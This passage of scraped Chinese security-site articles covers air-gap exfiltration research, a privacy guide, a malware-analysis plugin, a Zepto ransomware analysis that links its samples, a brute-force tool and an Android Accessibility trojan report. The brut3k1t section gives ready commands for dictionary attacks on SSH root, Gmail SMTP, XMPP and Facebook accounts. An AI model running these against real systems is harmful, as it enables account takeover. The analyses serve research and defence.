Guri带领的的研究人员们又提出了一种声学攻击方法：在目标机器的附近放置一台移动电话来监控电脑的风扇（如CPU和机箱风扇），因此他们称这种技术为Fansmitter。专家们开发了一种能够控制设备风扇从而窃取数据的恶意代码。这种技术允许向附近的手机以及附近的任何配备了麦克风的计算机以比特为单位发送数据。“过去的研究展示了恶意软件可以通过计算机的内置扬声器和外置扬声器传递声信号窃取信息”专家们发表的Fansmitter的论文这样写道。“用Fansmitter可以使用手机成功地在一个房间中多种距离下从闭塞网络中的没有扬声器的电脑窃取密码和密钥，”研究人员们在论文中写道，“除了台式电脑，我们的方法还适用于对付其它多种没有扬声器但装备了冷却风扇的设备（各种类型和各种尺寸的风扇），比如打印机，控制系统，嵌入式系统，物联网设备（loT devices）等。”他们组的实验展示了研究人员可以通过测量风扇的每分钟转数（RPM）对风扇产生噪声的频率以及强度进行统计。研究人员开发的恶意软件能够将风扇旋转产生特殊噪声转化成二进制数。风扇产生的噪声是在100到600赫兹范围内的。因为这个范围的噪声能够被人类的听觉识别到，所以研究人员得让他们的恶意软件在屋子里没人的时候进行数据传输。研究人员在他们的实验过程中使用了普通的带有CPU和机箱风扇的戴尔台式电脑，同时用一台三星Galaxy S4智能手机来捕获噪声。值得一提的是这些专家们的实验是在一个混有其他电脑以及空调噪声的环境中进行的。结果十分有趣，专家们在一米远的距离上使用低频（1000 RPM是“0”，1600 RPM是“1”）每分钟传送了3bit的数据，这意味着一个密码或者密钥中的字符需要花三分钟才能发送出来。增加Fansmitter的频率有可能获得更好的传输效率。比如专家们用2000—2500 RPM范围的转数就可以在四米远的距离上每分钟传送10bit的数据，用4000—4250 RPM的范围在一米的距离上就可以传送15bit的数据。2016年7月 – 硬盘过滤 – 通过声波信号黑掉闭塞网络硬盘过滤是本-古里安大学的一组研究人员设计的一种黑客技术。这个小组由Mordechai Guri，Yosef Solewicz，Andrey Daidakulov,，和Yuval Elovici组成。他们设计了一种方法可以从电脑硬盘发送出来的声信号中窃取数据。专家们发表了一篇题目为 DiskFiltration: Data Exfiltration from Speakerless Air-Gapped Computers via Covert Hard Drive Noise 的论文，里面有对这种技术的详细分析。硬盘过滤技术需要对硬盘中的驱动器组件的动作进行分析。这些动作是由能够访问磁盘允许读写的特定部分的磁盘臂产生的。磁盘臂的动作被称为“寻道操作”。在访问数据的过程中产生的噪声经过分析就可以查出来在当时在硬盘上访问的内容。包括密码和加密密钥。专家们进行了多次试验来分析硬盘过滤技术的工作效率。他们证明了这种攻击在六英尺的范围内都是有效的。它可以在每分钟内传输180bit的数据，这个速度可以在25分钟内获取到4096bit大小的密钥。硬盘过滤技术很有效，一些试验证明了这种技术硬盘使用了降低噪声的系统后仍然有效。专家们发现唯一的问题是在其他运行中的进程偶然产生的噪声有时候会干扰到它。论文中写道：“由于我们的隐蔽通道是在HDD活动（HDD activity）上建立的，其他进程在运行时偶然进行的文件操作会扰乱信息的传输”。下面的表格中写到了减轻硬盘过滤技术攻击的对策。（包含了基于软件，硬件和基于程序的措施）2015年8月 – USBee窃取数据，通过优盘发出的电磁信号从闭塞网络中窃取数据本-古里安大学网络安全中心研发部负责人Mordechai Guri和Morphisec Endpoint Security的首席科技官（chief scientist officer）同他们的团队设计了一种通过黑进闭塞网络窃取信息的称为USBee的新技术。    这些以色列研究人员利用USB的电磁辐射开发出了一个隐蔽通道。USBee技术利用植入射频发射器的USB连接器窃取数据。在这个情景中，USBee的应用程序安装到了一台暴露的电脑上。攻击者开发的USB盘已经连接到了电脑上，并且建立了一个短程的数据调制的射频发射器。在这个通信系统的另一端，数据被传输给附近的一个接收器然后被解码。“最近几年研究人员们已经搞懂了了攻击者如何使用植入了射频发射器的USB连接器来从安全的、甚至是闭塞网络中的电脑窃取数据（比如泄漏出来的NSA ANT 目录中的COTTONMOUTH）。这样的方法需要对USB设备本身和它的插头进行硬件的修改，在里面埋进一个专用的射频发射器。”专家们发表的论文中的介绍中这样写道，“在这篇论文中我们提到了USBee，这是一个能够将未经修改的USB设备作为射频发射器接入电脑的软件。我们示范了软件如何有意地从USB连接器的总线中发射射频信号。我们同时也展示了发射的射频信号可以经任意二进制码控制和调节。我们设计出了一个USBee的原型并用它实践了信号的产生和调制以及其他的一些细节。我们通过GNU无线电接收机来充当接收机和解调器来评估信号的传递质量。我们的评估结果表示USBee可以用来向附近的接收机传递带宽为20到80BPS（字节每秒）的二进制数据”研究人员们发现了 一系列“0”bit在USB端口传颂的时候会产生在240h到480h之间的辐射。研究人员们发明了一种机器可以通过从暴露的电脑向USB设备发送数据从而产生可控制的EMR传递调制数据。研究人员们使用附近的RF接收机接收EMR并把这些信息编码。Curi和他的团队能够使用这项技术每秒钟截获80字节的数据。这种传输速度可以使攻击者在10秒钟之内发出4096bit的密钥。和其他的攻击方式比起来这种攻击闭塞网络的方式还是很有趣的。专家们说他们可以使用这种算法来创建基础载波：inline static void fill_buffer_freq    (u32 *buf, int size, double freq)    {    int i = 0;    u32 x = 0;    double t = freq / 4800 * 2;    for (i = 0, x = 0x00000000; i&lt;size*8; i++)    {    x = x&lt;&lt;1;    if ((int)(i*t)%2==0)    x++;    if((i%32)==31)    {    *(buf++) = x;    x=0x00000000;    }    }    }在应用程序将fill_buffer_freq写入USB设备中任意数据块的时候，数据传输就会开始。这个应用需要的只是在设备上创建文件的权限。文件中这样写道：“实际的数据传输在fill_buffer_freq产生的字节模式写入USB设备的任意数据块或者写入流的时候就已经开始了。为了我们的这些目的，我们使用了USB盘的文件系统中的一个临时文件。传输程序并不需要特殊的权限（如root或admin这样的特殊权限）。它只需要一个在外接设备上的创建文件的权限。”研究人员们发布了一个视频，展示了他们是如何使用一个30美元的无线电天线在15英尺的范围上发动攻击并窃取数据的。总结在人们需要将一个系统从网络中脱离出来保护它和它的数据的时候，闭塞网络仍然是一种很严格的安全措施，典型的如军事网络和工业控制系统的结构。但是很不幸，攻击者们仍然会坚持不懈地通过各种不同的方式绕过安全措施。比如像Stuxnet Virus和Equation Group使用F anny工具进行的APT攻击。这些被揭露出来的事件证明了对脱离互联网的系统进行攻击仍然是可能实现的。没有绝对安全的系统！","2016-10-10 15:40:57","无线安全","“闭塞网络”攻击思路总结","http://nsoad.com/Article/wifi/20161010/517.html"
"5ccbfa444f2f0a0a7a69c040","写在前面的话Andy Grove曾经担任过英特尔公司的首席执行官，他参与了英特尔公司的创建并主导了公司在1980年-2000年间的成功发展。他是一位匈牙利出生的犹太裔美国著名企业","kong","写在前面的话Andy Grove曾经担任过英特尔公司的首席执行官，他参与了英特尔公司的创建并主导了公司在1980年-2000年间的成功发展。他是一位匈牙利出生的犹太裔美国著名企业家和工程师，毕业于美国著名高等学府加州大学伯克利分校。不幸的是，他在今年年初因帕金森病去世了，享年79岁。为什么要在文章开头提到他呢？不仅是要感谢他给现代工业发展所带来的积极影响，更重要的是他曾说过一句话，这句话对人们的影响极其深远，即“只有偏执狂才能生存”。他当之无愧为世界上最有影响力的人之一，当这样的人在鼓励我们成为“偏执狂”时，也许我们确实应该好好考虑考虑了。Andy Grove是一个非常谨慎的人，除了他之外，现在很多有影响力的人也是非常偏执的，比如说Facebook的小扎。还记得那位给黑客支付了一百多万美元只为解锁枪击案嫌疑人iPhone的FBI局长吗？没错，甚至连他都在鼓励大家赶紧用胶布把网络摄像头给挡住。如果你是一名遵纪守法的好同学，那你有什么好担心的呢？英国监控计划所打出的标语也在时刻提醒着我们，“如果你没有什么值得隐瞒的，那你就没有什么好担心的了。”话虽如此，但任何一位遵纪守法的好公民都有理由去担心和害怕。因为他们有理由去保护自己的设备、文件、以及他们与亲人朋友间的通信。红衣主教黎塞留（ Cardinal Richelieu）曾经曰过：“只要你给我六行由最诚实的人写下的东西,我就有本事从中找出足以处他绞刑的东西来。”在这篇文章中，我准备告诉大家如何利用目前最先进的加密技术来保护自己的信息安全。你只需要按照我的步骤认真操作，那么你的信息就能够得到足够的安全保障。每一个人都应该知道的安全常识先强调一点，我在这篇文章中介绍的操作步骤是100%不收钱的，而且绝对合法。在这里借用美国童子军的一句格言，“时刻准备着”。那么，让我们开始“准备”吧！首先，我要声明两个定义。当我使用“攻击者”这个术语时，指的是那些在没有得到你明确许可的情况下尝试访问你数据的那些人，无论他真的是一名黑客，还是一家公司，甚至是某国的政府。当我提到“隐私”或“安全”时，我指的是尽可能地保证隐私的安全。因为只要有人类活动的参与，我们的系统就永远不可能达到100%的安全。只要你的手机、电脑、以及各类账户能够得到有效的安全保护，那么其中的数据就是一个“加密块”，就算敌人再强大，他们也对此无能为力。技巧#1:让你的电子邮件收件箱使用双因素身份验证可能很多人都没有意识到，你们的邮箱才是最关键的地方。如果攻击者成功入侵了你的邮箱，那么他们不仅能读取你的邮件，而且甚至还可以重置你其他的账号密码。几乎你所有的账户都有可能因此而遭殃，包括社交媒体账号和银行账号在内。因此，想要提升安全性的话，最简单的方法就是赶紧开启你邮箱的双因素身份验证功能。双因素身份验证功能属于账号登录过程中的第二层安全保护机制，在登录的过程中你会收到一个验证码，输入了这个验证码之后你才可以正常登录。这个功能可以大大降低你的电子邮箱被黑客入侵的可能性。别等了，赶紧动手开启你邮箱的双因素身份验证功能！开启之后再接着往下看，现在就去，反正文章在这也不会跑！技巧#2:加密你的硬盘驱动器Window【操作方法】和MacOS【操作方法】都内置有硬盘加密功能，你要做的就是开启这些功能而已。技巧#3:开启手机的密码保护功能如果你的手机支持指纹解锁的话，赶紧开启指纹验证功能吧，总好过啥也没有！但是这还远远不够。根据美国宪法第五修正案（不得强迫自证其罪）中的规定，他人不得强迫你说出你的密码。但是法院可以强迫你使用指纹来解锁你的手机。毫无疑问，当攻击者获取到你的手机之后，你也没办法去修改手机中的指纹信息了。攻击者在尝试输入了十次密码之后，你的手机会被完全锁定。所以，如果你所使用的四位数字密码出现在了下面给出的常见密码列表中，请立刻修改！1234  99991111  33330000  55551212  66667777  11221004  13132000  88884444  43212222  20016969  1010小贴士：如果你为了方便使用而开启了指纹解锁功能，那么在你快被警方逮捕的时候记得要关机，因为再次开机之后你必须要输入密码才可以解锁手机。技巧#4:为不同的账号设置不同的密码今年年初，有一位黑客在网上公布了1170万个邮箱账号的密码，而小扎（Mark Zuckerberg）的密码“dadada”也包括在内。这不仅是他LinkedIn账号的密码，攻击者甚至还使用这个密码获取到了他Twitter账号和Pinterest账号的访问权。所以，请尽量避免重复使用相同的密码。当然了，想要记住这么多不同的密码，确实有点难为人，所以我建议你使用密码管理器。技巧#5:使用Signal服务来发送隐私短信Signal是一款热门的信息服务，电子前线基金会（ElectronicFrontier Foundation）对这项服务的评分非常高。你可以使用这项服务来发送文字、图片和视频信息，效果和之前一样，只不过这些数据现在得到了加密保护。Signal服务不仅是免费的，而且还是开源的，你可以在iOS和Android的应用商店中直接下载安装。只需五分钟，你就可以与朋友和家人进行安全通信了。第一步：安装Signal第二步：邀请你的朋友安装Signal第三步：发送信息恭喜你，你现在可以进行安全通信了。理论上来说，现在已经没有人可以监控你的通讯信息了。除此之外，你也可以使用Signal来进行安全的语音通话。技巧#6:浏览器的隐身模式还不够“隐私”即使你启用了Chrome和Firefox浏览器的“隐私模式”，下面这几个第三者仍然可以监控到你的网络活动：1.  互联网服务提供商；2.  校园网络、企业网络和社区网络的系统管理员，以及处于网络中的任何人；3.  谷歌等浏览器制造商；需要注意的是，IE、Safari、Opera以及其他的浏览器并没有“隐私模式”。如果你在进行网络活动时保持足够的“隐私”，我建议你使用Tor。技巧#7:使用Tor来保护你的“隐私”Tor指的是“洋葱路由”（The Onion Router），这是计算机网络中的一种匿名通信技术。洋葱路由(OR)的目标是保护一条信息发送者和接受者的隐私，同时当它在网络中转换时也提供对信息内容的保护。它是免费的、开源的，而且使用方法非常简单。第一步：下载Orbot第二步：下载Orfox浏览器第三步：开启Orbot第四步：打开Orfox第五步：验证配置是否正确访问check.torproject.org来验证你的安装和配置是否成功。恭喜你，现在几乎没人可以跟踪你的网络活动了。技巧#8:搜索中的“隐私模式”如果你觉得使用Tor很不方便的话，你至少应该使用DuckDuckGo【传送门】来保证你在进行网络搜索时的隐私安全。结束语如果你还想了解更多关于密码学和信息安全方面的知识，那么我建议各位阅读一下这本书：《Cybersecurityand Cyberwar: What Everyone Needs to Know》。感谢各位抽出你们宝贵的时间来阅读这篇文章，如果你喜欢这篇文章，别忘了点赞哟！","2016-11-19 13:11:37","安全工具","没时间了，赶紧上车！教你如何在一小时之内加密你的整个数字生活","http://nsoad.com/Security-tools/20161119/tools-816.html"
"5ccbfa444f2f0a0a7a69c041","该工具对于分析恶意代码比较有用，原理就是用pin动态结果，结合ida强大的反汇编功能，来加速恶意代码分析.","kong","前言该工具对于分析恶意代码比较有用，原理就是用pin动态结果，结合ida强大的反汇编功能，来加速恶意代码分析，工具分为两部分，一个是ida插件pinx.plw，一个是pin 插件idadbg.dll。如果对pin不太了解，可以看看我的上一篇文章(动态二进制检测框架Pin简介及API Log Tool)。把这个工具放出来，让大家玩玩 ，哈哈。功能:1.trace api2.dump内存字符串3.注入代码，写文件dump优点:1．将trace出来的api直接展示在ida中，但点击pinx中api trace结果的时候，会跳转到反汇编相应位置（如图）。2．Dump动态内存字符串，结果会在dynamic strings窗口展示（如图）如果存在注入，或者写文件操作，会dump出数据在pin目录下pinX IDA  界面配置步骤Host配置：1.在host目录中将pinx.plw放入IDA 的plugins目录（启动该插件的快捷方式是alt+f9或者在插件菜单栏中找到pinx）2.配置环境变量名%IDA%，值是:[IDA目录]/idavm.cmd3.Vmware根目录加入Path环境变量里4.在IDA根目录下新建idavm.cmd,内容为:Vmrun -gu &lt;username&gt;  -gp &lt;password&gt; copyFileFromHostToGuest &lt;vmx文件路径&gt;Guest虚拟机配置：在guest中将pin文件夹与工具放入 C:\使用步骤加载完样本后:1.启动IDA插件Pinx插件2.点击IDA插件pinx的RunFile按钮3.如果第二步不出问题，会在虚拟机C：\pin目录下生产x.cmd4.点击x.cmd，样本会运行起来5.获取虚拟机ip，然后写入IDA 的ip栏，点击connect，之后pin会获取api信息，动态内存字符串信息，然后发送给ida插件pinx。 另外：第一次使用时，请先双击下pin目录中的strings.exe，点同意(如下图)。工具地址：https://github.com/maldiohead/idapin使用过程中有什么问题，欢迎大家私信微博：f4ck_gfw，或者在github上提问，我会及时改进。","2016-11-25 17:17:07","安全工具","原创工具：Pinda套件—恶意样本分析利器","http://nsoad.com/Security-tools/20161125/tools-849.html"
"5ccbfa444f2f0a0a7a69c042","随着安全软件查杀技术的进步，安全软件对PE文件的查杀检测能力已是特征码时代的查杀方法难以望其项背。而非PE文件有着天生的躲避白名单的基因，这就使得越来越多的恶意PE采用“曲线救国”——使用非PE来进","Kong","* 本文原创作者：降草，本文属FreeBuf原创奖励计划，未经许可禁止转载前言随着安全软件查杀技术的进步，安全软件对PE文件的查杀检测能力已是特征码时代的查杀方法难以望其项背。而非PE文件有着天生的躲避白名单的基因，这就使得越来越多的恶意PE采用“曲线救国”——使用非PE来进行加载执行。本文分析的就是通过wsf脚本下载勒索软件后加载执行，以实现加密用户文件勒索比特比的目的。文本所分析的样本及分析时的idb文件下载地址：链接：http://pan.baidu.com/s/1dF5clYL 密码：2r7bwsf是WindowsScript File的缩写，是一种windows脚本文件，这种脚本可以包含多种不同脚本语言。只需在标签中指明该段程序是用何种语言编写的，就可以同时包含.vbs和.js脚本等内容。一．对脚本的调试样本脚本是个下载者，主要功能是从四个指定的网址中下载dll文件，随后通过rundll32.exe来调用dll文件的qwerty导出函数。1.   静态分析脚本为了躲避分析，进行了混淆。混淆的手段包括变量名混淆(变量名使用很长的无意义的字符)，加入无用字符，等义语句替换等。对于这个脚本，通过观察可以知道，脚本中的所有的变量名都加了“wedontcareroyals”前缀，可以通过全局删除掉“wedontcareroyals”使脚本看起来更直观。但即使这样，由于这个脚本代码众多而且代码中各式各样的字符串处理函数，使得无法一目了然的看出脚本功能。对于这种功能较复杂，各种字符转换函数的脚本最好的方法还是进行动态调试。2.   动态调试动态调试常用的有两种方法，一是在需要的地方通过打印显示出想要的信息，二是通过单步跟踪的方式进行调试。2.1 对于wsf脚本，可以使用WScript.Echo命令进行打印如在脚本第291处添加下面代码，就可以打印出脚本联网下载样本的地址 WScript.Echo(wedontcareroyalsFANCYHORDA6);运行样本后，可以看到弹窗中显示了样本下载dll的网址为：2.2 单步跟踪类似于我们平时使用OLLYDBG调试PE文件，我们也可以使用vs2008动态调试wsf脚本，调试的命令为cscript.exe，脚本路径  //X运行命令后会显示下面的界面，选择调试器后就可以用指定的调试器调试脚本。同样通过下断点也可以调试到联网下载文件的代码。下载文件后，会判断下载下来的文件是不是PE文件,其中ASCII值77代表是M，ASCII值90代表是Z,如果是PE文件，加上.dll后缀调用rundll32.exe加载qwerty函数 DoJVmk2.dll二．对勒索软件的分析将链接中的文件下载后，发现该文件是个勒索软件，运行后的效果如下：在每个加密过的文件夹下，都会有一个html文件向受害者显示勒索信息主要代码功能分析：勒索软件会遍历系统上的文件夹(包括共享目录)，计算文件的加密优先级，根据优先级决定加密文件的先后顺序，这主要是为了用最少的时间最大程序的破坏用户最重要的文件。同时软件还有删除备份镜像，回传用户信息等功能。1.    遍历指定扩展名的文件勒索软件为了加快遍历速度，对每个盘符开启一个线程，进行文件遍历：遍历时也会遍历共享目录，对共享文件下的文件内容也会加密   同时，为了防止加密系统软件导致系统无法启动，勒索软件会排除掉文件名中带有以下字符的文件：2.    加密优先级算法勒索软件会对根据文件的扩展名和文件大小决定文件的加密顺序，对遍历到的文件进行优先级打分，分值最高的优先加密。打分算法：1.    不同扩展名，对应不同的基础分，基础分可以为正数也可以为负数。基础分最高分为7分，为.key扩展名。最低分为-15分，最低分针对主要视频音频类文件格式。 2.    根据文件体积大小，在基础分的基础上进行相应的减分，而且是累积减分。大于1M，-5分大于10M,-10分大于100M,-10分大于1G,-10分假设一个大小大于1G的a.csr文件，根据算法计算分数的过程为为：.csr对应的基础分为6分，因为文件大小大于1G，则要减的分数为5+10+10+10=35,最终得分为6-35=-29分，这个分数在整体的文件系统中只能算是“差生”水平，在加密文件过程中，也会相应的“优后”加密。3.    加密后文件内容组成加密后文件的内容由两部分组成第一部分为：使用AES算法对原始文件内容加密第二部分为：解密块内容。通过逆向，得到解密块数据结构的生成算法为：1）   生成随机的16字节的AES密钥(也称为AES_KEY)2）   申请空间，写入下面三部分内容：1.    写入magic1：93 FE 56 89(内存顺序)，在magic1后面写入16字节的用户ID，2.    随后留出0×100大小的空间(在后面填充数据使用),3.    写入magic2：2A A1 1B D4(内存顺序)，在magic2后面写入当前文件名。3）   使用RSA算法加密1）中生成AES_KEY，并将加密结果替换2)中第二部分留空的0×100大小的空间中4）   使用AES加密2)中的第三部分数据并替换之通过上面步骤最终生成的解密块内容为：magic1 + 用户ID+ RSA(AES_KEY) + AES(magic2+filename)在调试的过程中，得到的其中一个解密块的内容如下图:其中红色框为：MAGIC1黄色框为：用户ID选中内容为：RSA(AES_KEY)青色框内为：AES(MAGIC2+filename)在计算上面的加密块算法中和RSA公钥保存在程序中，在运行过程中，导入公钥，用于加密生成的随机的AES密钥，导入RSA公钥的过程及所使用的RSA公钥如下：使用的AES_KEY，为随机生成:使用RSA公钥加密AES_KEY在此调用AES算法时，勒索软件为了达到最大运行速度，会判断CPU是否支持一些列用于处理AES加密和解密的指令。这在freebuf以前的文章中也有过提及，请参考《逆向分析及识别恶意代码中的AES算法》那么如何判断CPU是否支持AES加密与解密的指令的呢  答案是CPUID函数：如果cpu支持AES指令，可以看到调用aeskeygenassist指令使用AES算法加密magic2+filename:使用AES算法加密原始文件内容：4.    可以预见的解密的过程当勒索者收到赎金后，会提供给受害者RSA的私钥，对于加密过的文件，通过定位每个文件解密块的RSA(AES_KEY)部分，通过RSA私钥解密出AES_KEY，有了AES_KEY，就可以解密结构的后面部分得到文件的原始文件名，解密文件的前面部分得到文件内容，从而恢复文件。此外，由于RSA的公钥是硬编码在程序中的，因此对于不同的受害用户，勒索者可能会使用相同的解密程序对其进行解密。该勒索软件与常见勒索软件不同之处主要在于，第一优化了加密算法，如果CPU支持AES算法指令则直接使用CPU指令。第二优先加密重要的文件内容，用最快的速度把用户最有价值的文件加密。另外，对于用户，建议保持安全软件常开模式，同时避免打开来路不明的文件。 参考资料：https://www.bugsfighter.com/remove-zepto-ransomware-decrypt-zepto-files/http://securityaffairs.co/wordpress/49094/malware/zepto-ransomware.htmlhttps://www.helpnetsecurity.com/2016/07/05/locky-ransomware-variant-zepto/https://support.microsoft.com/zh-cn/kb/308364","2016-09-22 12:36:34","系统安全","伴着WSF重新杀回的Zepto勒索软件，它都对文档都做了什么","http://nsoad.com/Article/system/20160922/422.html"
"5ccbfa4d4f2f0a0a7a69c043","brut3k1t是一款服务端的暴力破解模块，支持多种协议的字典攻击。","blackhold","项目地址：https://github.com/ex0dus-0x/brut3k1t1. Introductionbrut3k1t是一款服务端的暴力破解模块，支持多种协议的字典攻击。目前完整支持的协议有：ssh  ftp  smtp  XMPP  instagram  facebook  将来会针对不同协议和服务实现对应的爆破模块（包括 Twitter, Facebook, Instagram）。2. 安装安装过程很简单。brut3k1t 需要解决一些依赖，如果你没有的话，程序会安装对应依赖。argparse - 用于解析命令行参数paramiko - 用于 SSH 连接和认证ftplib - 用于 FTP 连接和认证smtplib - 用于 SMTP （email）连接和认证fbchat - 用于连接 Facebookselenium - 用于 web 抓取，用于 Instagram （之后会用于 Twitter）xmppy - 用于 XMPP 连接 ...以及将来会使用更多!下载很简单。使用 git clone。git clone https://github.com/ex0dus-0x/brut3k1t  切换路径：cd /path/to/brut3k1t  3. 使用使用 brut3k1t 比直接运行 Python 文件稍微复杂一点。python brut3k1t -h 可以显示帮助菜单。usage: brut3k1t.py [-h] [-s SERVICE] [-u USERNAME] [-w PASSWORD] [-a ADDRESS]                 [-p PORT] [-d DELAY]Server-side bruteforce module written in Pythonoptional arguments:  -h, --help            show this help message and exit-a ADDRESS, --address ADDRESS                    Provide host address for specified service. Required                    for certain protocols-p PORT, --port PORT  Provide port for host address for specified service.                    If not specified, will be automatically set-d DELAY, --delay DELAY                    Provide the number of seconds the program delays as                    each password is triedrequired arguments:  -s SERVICE, --service SERVICE                    Provide a service being attacked. Several protocols                    and services are supported-u USERNAME, --username USERNAME                    Provide a valid username for service/protocol being                    executed-w PASSWORD, --wordlist PASSWORD                    Provide a wordlist or directory to a wordlist用法示例破解 192.168.1.3 上运行的 SSH 服务器，使用 root 和 wordlist.txt 作为字典文件。python brut3k1t.py -s ssh -a 192.168.1.3 -u root -w wordlist.txt  程序将自动将端口设置为 22，但如果是不同的端口，使用 -p 指定。使用 wordlist.txt 字典破解 25 端口的 test@gmail.com，3 秒延迟。破解 email 必须指定 SMTP 服务器的地址。例如 Gmail = smtp.gmail.com。你可以在 Google 上搜索相关内容。python brut3k1t.py -s smtp -a smtp.gmail.com -u test@gmail.com -w wordlist.txt -p 25 -d 3  使用 wordlist.txt 字典破解 5222 端口的 test@creep.im。XMPP 与 SMTP 类似，而你需要提供 XMPP 服务器的地址，此例是 creep.im 。python brut3k1t.py -s xmpp -a creep.im -u test -w wordlist.txt  破解 Facebook 颇具挑战性，因为你需要目标用户 ID 而不是用户名。python brut3k1t.py -s facebook -u 1234567890 -w wordlist.txt  使用用户名 test 和字典文件 wordlist.txt 破解 Instagram 账号，五秒延迟。注意事项如果不提供 -p 标志，将使用该服务的默认端口。你不需要为 Facebook 和 Instagram 提供，他们是基于 web 的。如果你不提供 -d 标志，默认是 1。记得使用 -a 标志指定 SMTP 和 XMPP 服务器的地址。Facebook 要求 用户 ID。可能会遇到一些挫折，因为一些人不会把他们的 ID 公开在资料中。确保指定字典文件及其路径。如果在 /usr/local/wordlists/wordlist.txt 中，使用 -w标志指定。注意一些协议并不是基于默认端口的。FTP 服务器并不一定会在 21 端口上运行。请牢记于心。用于教育和友情检测，以及学习代码和安全实践。没有脚本小子！","2016-11-21 20:50:58","安全工具","brut3k1t - 一款模块化的服务端暴力破解工具","http://nsoad.com/Security-tools/20161121/tools-830.html"
"5ccbfa4e4f2f0a0a7a69c044","近期，360烽火实验室发现一款滥用Accessibility的木马，该木马具有浏览器地址栏劫持、搜索劫持、桌面点击劫持以及防卸载等系列恶意行为，本报告将结合我们对该木马的分析，从Accessbility的设计初衷、技术","silence","第一章Accessibility简介近期，360烽火实验室发现一款滥用Accessibility的木马，该木马具有浏览器地址栏劫持、搜索劫持、桌面点击劫持以及防卸载等系列恶意行为，本报告将结合我们对该木马的分析，从Accessbility的设计初衷、技术发展、滥用情况等角度研究Accessibility的安全性。一、 设计意义依据Android官方文档，考虑到一些用户不能很好地使用Android设备，比如由于视力、身体、年龄方面的限制，造成阅读内容、触控操作、声音信息等方面的获取困难，因此Android提供了Accessibility特性和服务帮助用户更好地使用Android设备。正由于这个介绍，在国内更普遍地被称为无障碍或残疾人模式。Accessibility的官方简介内容如下图，有兴趣详细了解该部分内容请参考官网详解[1]。图1.1Accessibility官方简介二、 运行原理Accessibility[2]相关服务以及接口在Android 1.6时期就已经被加入，其中以AccessibilityService组件作为入口，结合AccessibilityEvent，AccessibilityNodeInfo等关键类完成辅助功能（其中AccessibilityNodeInfo于Android 4.0加入）。AccessibilityService是继承了Service的抽象类，生命周期不由应用本身管理，而是由系统和用户的显式操作所控制，运行后当有AccessibilityEvent被发出时该服务会收到系统的回调。由于是由系统所启动的组件，所以与一般Service有所区别，特别的地方在于满足下面三点：1)该Service需要权限android.permission.BIND_ACCESSIBILITY_SERVICE，该权限保证了只有系统能绑定调用该服务；2)第二点，该Service需要action：android.accessibilityservice.AccessibilityService；3)第三点，提供名为android.accessibilityservice的meta-data，且提供xml作为AccessibilityService的配置文件，配置文件声明有该服务接收事件类型、反馈类型等内容。三、 使用情况依据Android官方的详细介绍，开发者应该从自身应用出发，在增加视图属性如contentDescription等内容后，可以在不修改原有代码逻辑的情况下使用户体验得到优化，如预装在Android 设备上的屏幕阅读器TalkBack[3]，在没有修改系统源码的情况下，满足了视力不足的用户使用Android设备的需求。根据Android官方的说明，TalkBack会使用语音反馈描述用户所执行的操作，以及告知用户收到的提醒和通知，可以帮助视力水平较低的用户顺利进行手机的触控、阅读内容的进行。在国内，Accessibility被更多地用于免ROOT自动安装以及自动抢红包功能的实现，免ROOT自动安装可以优化用户体验，但自动抢红包功能既没有帮助有缺陷用户更好的使用手机，也没有提升用户体验，与Android官方的设计初衷已经背离，进入了灰色地带的范畴，同时利用Accessibility进行的恶意行为也越来越多，需要引起足够重视。第二章Accessibility发展趋势2016年我们发现带有Accessibility功能的样本数量呈现爆发性增长，但很遗憾，Accessibility功能的使用却与Android官方的初衷渐行渐远。2009年Android 1.6发布，早在7年前Accessibility就已经面世。然而，在数据分析当中却发现，直至2012年才收录有使用该技术的样本，而且占样本总数的比例极低，仅有0.015%，随后两三年的时间里Accessibility的使用比例仍然偏低，甚至于到2015年时占比仍不足0.5%，但是在2016年上半年里占比已经超过了2.6%，同时仅仅2016年上半年的样本数量已经是2015年一整年样本数量的3倍，相关的样本数量及相关比例发展趋势见图2.1。图2.1 Accessibility样本数量及占比趋势从数据角度进行分析，虽然在2015年里使用Accessibility的样本数量已经突破了20万，但是这个数字在样本总数所占的比例仍不足0.5%，相当于每200个样本当中才能勉强找出1个带有Accessibility功能的样本。因此，在一定程度上说，在Accessibility诞生的前六年里，该项服务的使用比例是符合谷歌预期的，正如谷歌官方的介绍，Accessibility是为了让身体不便的用户更好地使用手机，目标用户群体比例较小，因而理想状态样本比例也应该相对较少。对样本增长状况的研究，发现Accessibility样本大致可以划分为从一开始的合理利用时期，发展到用于提升用户体验，继而转向到灰色地带，逐步背离了安卓谷歌的设计初衷。一、 合理利用上文提及了安卓官方对Accessibility的说明，那么如何才是对Accessibility的合理利用呢？这里不得不再次所提起屏幕阅读器TalkBack，其可以作为无障碍应用的一个优秀范例，具体体现为下面三个方面：1)目标用户恰当。如设计意义中所介绍，Accessibility主要是面向于身体等方面存在残疾或不足的用户，而TalkBack则是直接面向视力存在障碍或不足的用户；2)更好地使用设备。安卓官方希望通过Accessibility提供多种方式的转换，达到让特殊用户更好的使用手机的目的，在这一点上TackBack具体表现为给用户提供了多方面的语言反馈，如触摸、文字、输入等多方面的语音提示，让视力存在障碍或不足的用户在操作手机当中得到可靠的帮助，使得用户能无障碍地使用手机。3)在不影响原有代码情况下实现了功能扩展。这是Accessibility一个很优秀的特质，谷歌不需要在系统源码当中修改或增加任何内容，只对外提供了Accessibility功能，就满足了视力不足用户对于使用手机的日常需求，达到不修改原有程序逻辑的情况下还优化了用户体验的目的。可见，在上述三个方面的引导下，Accessibility应该是一个面向特殊人群的，对开发者友好的一个服务。二、 提升体验需求是带动开发者去了解学习新技术的一大动力，在2015年里，各大应用市场均提供了“免ROOT自动安装”的功能选项，同时由于这个功能的推出，使得越来越多的开发者去探究了解Accessibility这项技术。免ROOT自动安装，又有“智能安装”的说法。应用市场在没ROOT权限的条件下，安装或更新软件时会弹出应用安装界面，而用户想要安装或更新多个应用时，需要用户多次主动去点击安装按钮，造成用户使用上的不便，免ROOT自动安装正为了解决用户希望免去反复的点击操作这个需求而产生。虽然此功能没有面向特殊人群而是面向了普遍用户，但是免去了用户更新软件时反复操作，提升了用户体验。以360手机助手作为一个范例，用户手机即使没有ROOT，开启了360手机助手的辅助功能以后，也可以方便地进行应用的批量安装、更新或卸载，不再需要用户繁琐地点击安装或卸载按钮。免ROOT自动安装逻辑流程图见图2.2。三、 